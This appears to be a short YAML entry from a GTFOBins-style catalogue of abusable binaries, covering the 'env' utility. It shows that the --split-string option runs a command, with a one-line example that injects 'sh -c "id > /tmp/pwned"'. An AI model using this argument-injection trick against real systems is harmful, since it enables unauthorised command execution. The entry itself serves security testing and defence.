---
title: env
functions:
  command:
    - description: The `--split-string` parameter accepts multiple additional arguments. The first positional argument without an `=` executes as a command.
      code: |
        env '--split-string=sh -c "id > /tmp/pwned"' foo
---
